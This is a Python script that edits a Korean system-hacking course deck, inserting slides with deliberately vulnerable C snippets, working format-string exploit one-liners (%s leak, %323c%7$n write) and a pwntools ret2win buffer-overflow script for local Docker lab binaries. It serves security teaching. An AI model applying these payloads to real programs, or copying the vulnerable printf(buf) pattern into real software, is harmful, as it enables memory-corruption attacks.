#!/usr/bin/env python3
"""Align the Day 1 deck with the verified Docker FSB/BOF labs.

Requires python-pptx. The script keeps a one-time backup next to the deck,
updates the four existing FSB slides, and inserts three hands-on slides.
"""

from __future__ import annotations

import copy
import re
import shutil
from pathlib import Path

from pptx import Presentation
from pptx.util import Pt


ROOT = Path(__file__).resolve().parents[2]
DECK = ROOT / "KSJ_시스템해킹_1일차_문제와정답.pptx"
BACKUP = ROOT / "KSJ_시스템해킹_1일차_문제와정답_수정전.pptx"


def set_text(shape, value: str, size: float | None = None) -> None:
    """Replace text while retaining the first run's existing formatting."""
    if not shape.has_text_frame:
        raise AssertionError(f"shape has no text frame: {shape}")
    paragraphs = shape.text_frame.paragraphs
    first = paragraphs[0]
    if first.runs:
        first.runs[0].text = value
        for run in first.runs[1:]:
            run.text = ""
    else:
        first.add_run().text = value
    for paragraph in paragraphs[1:]:
        for run in paragraph.runs:
            run.text = ""
    if size is not None:
        for paragraph in shape.text_frame.paragraphs:
            for run in paragraph.runs:
                run.font.size = Pt(size)


def set_code_lines(slide, shape_indexes: list[int], lines: list[str], size: float) -> None:
    assert len(shape_indexes) == len(lines)
    for shape_index, line in zip(shape_indexes, lines):
        set_text(slide.shapes[shape_index], line, size)


def clone_slide(prs: Presentation, source_index: int):
    """Clone a vector/text-only course slide onto the blank layout."""
    source = prs.slides[source_index]
    target = prs.slides.add_slide(prs.slide_layouts[0])
    for shape in source.shapes:
        new_element = copy.deepcopy(shape.element)
        target.shapes._spTree.insert_element_before(new_element, "p:extLst")
    return target


def reorder_slides(prs: Presentation) -> None:
    slide_ids = prs.slides._sldIdLst
    original = list(slide_ids)[:-3]
    added = list(slide_ids)[-3:]
    desired = original[:11] + [added[0]] + original[11:13] + added[1:] + original[13:]
    for slide_id in list(slide_ids):
        slide_ids.remove(slide_id)
    for slide_id in desired:
        slide_ids.append(slide_id)


def update_existing_fsb_slides(prs: Presentation) -> None:
    read_lines = [
        "char flag_buf[64];  /* 0x0804c060 */",
        "int main(void) {",
        "    char buf[256];",
        "    memset(buf, 0, sizeof(buf));",
        "    load_flag();",
        '    printf("Input: ");',
        "    read(0, buf, sizeof(buf) - 1);",
        "    printf(buf);  /* 취약점 */",
        "    return 0;",
        "}",
    ]
    write_lines = [
        "extern int changeMe; /* 0x0804c028 */",
        "struct InputFrame {",
        "    uint32_t stack_pad[3];",
        "    char buf[80];",
        "    uint32_t stack_tail;",
        "};",
        "read(0, input.buf, sizeof(input.buf) - 1);",
        "printf(input.buf); /* 7번째 인자 */",
        "if (changeMe == 327)",
        '    puts("KSJ{FSB_PERCENT_N_WRITE_VERIFIED}");',
    ]

    read_problem = prs.slides[9]
    read_answer = prs.slides[10]
    write_problem = prs.slides[11]
    write_answer = prs.slides[12]

    assert read_problem.shapes[3].text == "FSB ① 정보 유출"
    assert read_answer.shapes[3].text == "FSB ① 정보 유출"
    assert write_problem.shapes[3].text == "FSB ② 메모리 값 쓰기"
    assert write_answer.shapes[3].text == "FSB ② 메모리 값 쓰기"

    set_text(read_problem.shapes[8], "SOURCE CODE · 01.c 핵심 부분", 13)
    set_code_lines(read_problem, list(range(11, 30, 2)), read_lines, 12)
    set_text(read_problem.shapes[35], "nm -n ./01에서 flag_buf 주소를 확인하라.", 14)
    set_text(read_problem.shapes[38], "주소를 4번째 인자로 맞추고 %s로 내용을 출력하라.", 14)
    set_text(
        read_problem.shapes[40],
        "Docker 01.c / 실행 ./01 (별칭 ./fsb32_read)    |    i386 · GDB/pwndbg 검증 실습",
        9,
    )

    set_text(read_answer.shapes[9], "취약 지점 / 01.c 핵심 부분", 13)
    set_code_lines(
        read_answer,
        [12, 14, 16, 18, 20, 22, 24, 27, 29, 31],
        read_lines,
        10.5,
    )
    set_text(read_answer.shapes[36], "flag_buf = 0x0804c060", 15)
    set_text(read_answer.shapes[39], "주소 뒤 3개의 %x로 인자 이동", 14)
    set_text(read_answer.shapes[42], "4번째 %s가 flag_buf 역참조", 14)
    set_text(read_answer.shapes[45], "• printf(buf)는 입력을 서식 문자열로 해석한다.", 12)
    set_text(read_answer.shapes[46], "• i386 스택에서 입력 시작은 printf의 4번째 인자로 확인됐다.", 12)
    set_text(read_answer.shapes[47], "• 주소 0x0804c060은 little-endian 바이트 60 c0 04 08로 넣는다.", 12)
    set_text(read_answer.shapes[49], "검증: nm -n ./01 | grep flag_buf  →  0804c060 B flag_buf", 14)
    set_text(
        read_answer.shapes[50],
        "Docker 01.c / 실행 ./01 (별칭 ./fsb32_read)    |    FmtStr offset=4 검증 완료",
        9,
    )

    set_text(write_problem.shapes[8], "SOURCE CODE · 02.c 핵심 부분", 13)
    set_code_lines(write_problem, list(range(11, 30, 2)), write_lines, 10.5)
    set_text(write_problem.shapes[35], "AAAA와 %p 10개로 0x41414141의 인자 위치를 찾아라.", 13)
    set_text(write_problem.shapes[38], "%n으로 changeMe를 정확히 327로 변경하라.", 14)
    set_text(
        write_problem.shapes[40],
        "Docker 02.c / 실행 ./02 (별칭 ./fsb32_write)    |    i386 · GDB/pwndbg 검증 실습",
        9,
    )

    set_text(write_answer.shapes[9], "취약 지점 / 02.c 핵심 부분", 13)
    set_code_lines(
        write_answer,
        [12, 14, 16, 18, 20, 23, 25, 27, 29, 31],
        write_lines,
        9.5,
    )
    set_text(write_answer.shapes[36], "주소 4바이트 출력", 15)
    set_text(write_answer.shapes[39], "%323c → 누적 327바이트", 14)
    set_text(write_answer.shapes[42], "%7$n → changeMe = 327", 14)
    set_text(write_answer.shapes[45], "• 입력 시작 0x41414141은 printf의 7번째 인자에서 확인된다.", 11.5)
    set_text(write_answer.shapes[46], "• 주소 4바이트 + %323c = 총 327바이트이므로 %n이 327을 쓴다.", 11.5)
    set_text(write_answer.shapes[47], "• 쉘에서는 %7$n의 $가 확장되지 않도록 작은따옴표를 사용한다.", 11.5)
    set_text(write_answer.shapes[49], "검증 결과: changeMe=327  /  KSJ{FSB_PERCENT_N_WRITE_VERIFIED}", 14)
    set_text(
        write_answer.shapes[50],
        "Docker 02.c / 실행 ./02 (별칭 ./fsb32_write)    |    FmtStr offset=7 검증 완료",
        9,
    )


def build_read_exploit_slide(slide) -> None:
    assert slide.shapes[3].text == "FSB ① 정보 유출"
    set_text(slide.shapes[3], "FSB ① 익스플로잇 실행", 26)
    set_text(slide.shapes[5], "실습")
    set_text(slide.shapes[9], "Python 2.7 원라이너", 14)
    lines = [
        "cd /home/exp/ksj-labs/day1/01-fsb-read",
        "nm -n ./01 | grep flag_buf",
        "",
        r'''python2.7 -c 'print "\x60\xc0\x04\x08, %x, %x, %x, %s"' | ./fsb32_read''',
        "",
        "# 숫자 파일명으로 실행해도 동일",
        r'''python2.7 -c 'print "\x60\xc0\x04\x08, %x, %x, %x, %s"' | ./01''',
        "",
        "# 성공 시 KSJ{FSB_READ_...} 출력",
        "# Python 2.7은 이 원라이너 호환용으로만 사용",
    ]
    code_indexes = [12, 14, 16, 18, 20, 22, 24, 27, 29, 31]
    set_code_lines(slide, code_indexes, lines, 8.5)
    set_text(slide.shapes[33], "페이로드 해석", 14)
    set_text(slide.shapes[36], "60 c0 04 08 → flag_buf 주소", 13)
    set_text(slide.shapes[39], "%x 3개 → 다음 인자로 이동", 13)
    set_text(slide.shapes[42], "%s → 주소가 가리키는 문자열 출력", 13)
    set_text(slide.shapes[44], "GDB 확인", 13)
    set_text(slide.shapes[45], "• gdb -q ./01", 12)
    set_text(slide.shapes[46], "• b printf 또는 b 01.c:30", 12)
    set_text(slide.shapes[47], "• x/s 0x0804c060으로 flag_buf 내용을 확인한다.", 12)
    set_text(slide.shapes[49], "복사할 때 ASCII 작은따옴표(')와 하이픈(-)을 사용하세요.", 14)
    set_text(slide.shapes[50], "Docker 실동작 검증 완료    |    ./fsb32_read는 ./01의 호환 별칭", 9)


def build_write_exploit_slide(slide) -> None:
    assert slide.shapes[3].text == "FSB ② 메모리 값 쓰기"
    set_text(slide.shapes[3], "FSB ② 익스플로잇 실행", 26)
    set_text(slide.shapes[5], "실습")
    set_text(slide.shapes[9], "인자 탐색 및 %n 쓰기", 14)
    lines = [
        "cd /home/exp/ksj-labs/day1/02-fsb-write",
        "",
        "# 1) 7번째 인자에서 0x41414141 확인",
        '''(python2.7 -c 'print "AAAA"+",%p"*10'; cat) | ./fsb32_write''',
        "",
        "# 2) 0x0804c028에 정수 327 쓰기",
        r'''(python2.7 -c 'print "\x28\xc0\x04\x08%323c%7$n"'; cat) | ./fsb32_write''',
        "",
        "# 숫자 파일명 사용 시 fsb32_write 대신 02",
        "# 중요: %7$n에서 $를 생략하지 않는다.",
    ]
    code_indexes = [12, 14, 16, 18, 20, 23, 25, 27, 29, 31]
    set_code_lines(slide, code_indexes, lines, 7.8)
    set_text(slide.shapes[33], "페이로드 해석", 14)
    set_text(slide.shapes[36], "28 c0 04 08 → changeMe 주소", 13)
    set_text(slide.shapes[39], "4 + 323 → 누적 출력 327", 13)
    set_text(slide.shapes[42], "%7$n → 7번째 포인터에 327 기록", 13)
    set_text(slide.shapes[44], "성공 기준", 13)
    set_text(slide.shapes[45], "• changeMe=327", 12)
    set_text(slide.shapes[46], "• KSJ{FSB_PERCENT_N_WRITE_VERIFIED}", 11.5)
    set_text(slide.shapes[47], "• GDB에서 x/wd 0x0804c028로 값 327을 확인한다.", 11.5)
    set_text(slide.shapes[49], "작은따옴표 안의 $는 쉘 변수로 확장되지 않으며 %7$n 그대로 전달됩니다.", 13)
    set_text(slide.shapes[50], "Docker 실동작 검증 완료    |    ./fsb32_write는 ./02의 호환 별칭", 9)


def build_pwntools_slide(slide) -> None:
    assert slide.shapes[3].text == "BOF ① Return Address"
    set_text(slide.shapes[3], "BOF 시작 전: pwntools 스크립트 기초", 24)
    set_text(slide.shapes[5], "기초")
    set_text(slide.shapes[8], "PYTHON 3 · solve_reference.py", 13)
    lines = [
        "from pwn import *",
        'context.binary = elf = ELF("./bof_ret2win")',
        "p = process(elf.path)",
        "offset = 520",
        'payload = b"A" * offset',
        'payload += p64(elf.sym["win"])',
        r'''p.sendafter(b"Send payload:\n", payload)''',
        "print(p.recvall().decode())",
        "# 중간 분석: gdb.attach(p)",
        "# 쉘 상호작용: p.interactive()",
        '# 상세 로그: context.log_level = "debug"',
    ]
    set_code_lines(slide, list(range(11, 32, 2)), lines, 10)
    set_text(slide.shapes[34], "핵심 API", 14)
    set_text(slide.shapes[37], "ELF / elf.sym / p64\n바이너리·심볼·주소 패킹", 13)
    set_text(slide.shapes[40], "process / sendafter / recvall\n프로세스 실행·송수신 자동화", 13)
    set_text(
        slide.shapes[41],
        "실행: cd /home/exp/ksj-labs/day1/03-bof-ret2win && python3 solve_reference.py",
        10,
    )
    set_text(slide.shapes[42], "Docker pwntools 4.14.1 검증 완료    |    다음 장부터 BOF 실습", 9)


def update_page_numbers(prs: Presentation) -> None:
    total = len(prs.slides)
    assert total == 24
    for number, slide in enumerate(prs.slides, start=1):
        matches = [
            shape
            for shape in slide.shapes
            if shape.has_text_frame and re.fullmatch(r"\d+ / \d+", shape.text)
        ]
        if number == 1:
            assert not matches
            continue
        assert len(matches) == 1, (number, len(matches))
        set_text(matches[0], f"{number:02d} / {total}")


def main() -> None:
    if not BACKUP.exists():
        shutil.copy2(DECK, BACKUP)

    prs = Presentation(DECK)
    assert len(prs.slides) == 21, "Run only against the original 21-slide deck."
    update_existing_fsb_slides(prs)

    read_exploit = clone_slide(prs, 10)
    write_exploit = clone_slide(prs, 12)
    pwntools = clone_slide(prs, 13)
    build_read_exploit_slide(read_exploit)
    build_write_exploit_slide(write_exploit)
    build_pwntools_slide(pwntools)
    reorder_slides(prs)
    update_page_numbers(prs)
    prs.save(DECK)
    print(f"updated: {DECK}")
    print(f"backup:  {BACKUP}")
    print(f"slides:  {len(prs.slides)}")


if __name__ == "__main__":
    main()
